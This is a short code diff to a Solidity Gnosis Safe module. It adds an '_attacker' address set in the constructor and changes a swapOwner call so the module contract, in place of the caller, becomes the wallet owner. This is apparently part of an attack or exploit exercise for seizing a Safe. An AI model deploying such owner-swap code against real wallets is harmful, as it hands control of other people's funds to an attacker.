@@ -17,6 +17,12 @@ import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 contract ControllerModule is ModuleManager {
     GnosisSafe internal proxy;
 
+    address private _attacker;
+
+    constructor(address attacker) {
+        _attacker = attacker;
+    }
+
     function setup(address payable proxy_) public {
         proxy = GnosisSafe(proxy_);
     }
@@ -44,7 +50,7 @@ contract ControllerModule is ModuleManager {
                 "swapOwner(address,address,address)",
                 address(0x1),
                 walletOwner,
-                msg.sender
+                address(this)
             )
         );
     }
